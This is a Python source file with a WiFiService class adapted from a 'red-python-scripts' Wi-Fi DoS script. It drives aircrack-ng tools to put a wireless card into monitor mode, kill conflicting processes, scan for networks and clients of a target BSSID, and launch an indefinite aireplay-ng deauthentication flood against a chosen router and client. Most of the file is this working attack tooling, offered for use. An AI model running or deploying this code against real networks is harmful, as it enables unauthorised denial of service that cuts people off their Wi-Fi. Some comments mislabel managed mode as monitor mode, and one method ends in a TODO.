'''
    <https://github.com/davidbombal/red-python-scripts/blob/main/wifi_dos_own.py>
'''

import logging
import re

from ..main import Context
from ..utils.utils import Utils

# ------------------------------------------------------------------------------
#
#
#
# ------------------------------------------------------------------------------


class WiFiService:

    # Regular Expressions to be used.
    mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
    wlan_code = re.compile('Interface (wlan[0-9]+|wlp[0-9]+s[0-9]+)')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def __init__(self, ctx: Context):
        self.ctx: Context = ctx
        self.utils: Utils = self.ctx.utils
        logging.log(logging.DEBUG, 'wifi-service is initiated')

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------

    def find_nic(self):
        '''
            This function is used to find the network interface controllers on your computer.
        '''
        # We use the subprocess.run to run the 'sudo iw dev' command we'd normally run to find the network interfaces.
        result = self.utils.run_command_output_loop('find nic', [['iw', 'dev']])
        network_interface_controllers = self.wlan_code.findall(result)
        return network_interface_controllers

    def set_monitor_mode(self, wifi_name):
        '''
            This function needs the network interface controller name to put it into monitor mode.
            Argument: wifi_name => Network Controller Name
        '''
        # Put WiFi controller into monitor mode.
        # This is one way to put it into monitoring mode. You can also use iwconfig, or airmon-ng.
        self.utils.run_command_output_loop('monitor mode (down)', [['ip', 'link', 'set', wifi_name, 'down']])
        # Killing conflicting processes makes sure that nothing interferes with putting controller into monitor mode.
        self.utils.run_command_output_loop('monitor mode (kill)', [['airmon-ng', 'check', 'kill']])
        # Put the WiFi nic in monitor mode.
        self.utils.run_command_output_loop('monitor mode (set)', [['iw', wifi_name, 'set', 'monitor', 'none']])
        # Bring the WiFi controller back online.
        self.utils.run_command_output_loop('monitor mode (up)', [['ip', 'link', 'set', wifi_name, 'up']])

    def set_band_to_monitor(self, choice, wifi_name):
        '''
            If you have a 5Ghz network interface controller you can use this function to put monitor either 2.4Ghz or 5Ghz bands or both.
        '''
        if choice == '0':
            # Bands b and g are 2.4Ghz WiFi Networks
            self.utils.run_command_output_loop('band (bg)', [['airodump-ng', '--band', 'bg', '-w', 'file',
                                               '--write-interval', '1', '--output-format', 'csv', wifi_name]])
        elif choice == '1':
            # Band a is for 5Ghz WiFi Networks
            self.utils.run_command_output_loop('band (a)', [['airodump-ng', '--band', 'a', '-w', 'file',
                                               '--write-interval', '1', '--output-format', 'csv', wifi_name]])
        else:
            # Will use bands a, b and g (actually band n). Checks full spectrum.
            self.utils.run_command_output_loop('band (abg)', [['airodump-ng', '--band', 'abg', '-w', 'file',
                                               '--write-interval', '1', '--output-format', 'csv', wifi_name]])

    def set_into_managed_mode(self, wifi_name):
        '''
            SET YOUR NETWORK CONTROLLER INTERFACE INTO MANAGED MODE & RESTART NETWORK MANAGER
            ARGUMENTS: wifi interface name
        '''
        # Put WiFi controller into monitor mode.
        # This is one way to put it into managed mode. You can also use iwconfig, or airmon-ng.
        self.utils.run_command_output_loop('manage mode (down', [['ip', 'link', 'set', wifi_name, 'down']])
        # Put the WiFi nic in monitor mode.
        self.utils.run_command_output_loop('manage mode (set)', [['iwconfig', wifi_name, 'mode', 'managed']])
        self.utils.run_command_output_loop('manage mode (up)', [['ip', 'link', 'set', wifi_name, 'up']])
        self.utils.run_command_output_loop('manage mode (start)', [['service', 'NetworkManager', 'start']])

    def get_clients(self, hackbssid, hackchannel, wifi_name):
        self.utils.run_command_output_loop('get clients', [['airodump-ng', '--bssid', hackbssid, '--channel', hackchannel, '-w',
                                                           'clients', '--write-interval', '1', '--output-format', 'csv', wifi_name]])

    def deauth_attack(self, network_mac, target_mac, interface):
        # We are using aireplay-ng to send a deauth packet. 0 means it will send it indefinitely. -a is used to specify the MAC address of the target router. -c is used to specify the mac we want to send the deauth packet.
        # Then we also need to specify the interface
        self.utils.run_command_output_loop('deauth atack', [['aireplay-ng', '--deauth', '0', '-a', network_mac, '-c', target_mac, interface]])

    def run_airmon(self, wifi_name, hackchannel):
        # Make sure that airmon-ng is running on the correct channel.
        self.utils.run_command_output_loop('run airmon', [["airmon-ng", "start", wifi_name, hackchannel]])
        # TODO: ...

    # --------------------------------------------------------------------------
    #
    #
    #
    # --------------------------------------------------------------------------
